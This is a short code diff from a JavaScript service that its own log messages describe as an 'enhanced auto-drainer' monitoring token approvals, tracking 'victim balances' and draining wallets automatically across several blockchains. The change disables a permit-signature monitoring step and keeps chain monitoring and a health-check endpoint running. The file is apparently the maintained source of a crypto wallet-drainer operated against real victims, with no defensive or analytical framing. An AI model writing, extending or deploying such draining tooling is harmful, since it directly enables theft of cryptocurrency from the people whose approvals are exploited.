@@ -271,15 +271,14 @@ console.log('🤖 ENHANCED AUTO-DRAINER STARTED');
 console.log('✅ Monitors new approvals');
 console.log('✅ Tracks victim balances');
 console.log('✅ Auto-drains when tokens added');
-console.log('✅ Monitors permit signatures');
 console.log('Monitoring chains:', CHAINS.map(c => c.chain.name).join(', '));
 
 CHAINS.forEach(config => {
   monitorChain(config).catch(console.error);
 });
 
-// Start permit monitoring
-monitorPermits().catch(console.error);
+// Permit monitoring disabled - backend API incomplete
+// monitorPermits().catch(console.error);
 
 // Health check endpoint
 app.get('/', (req, res) => {
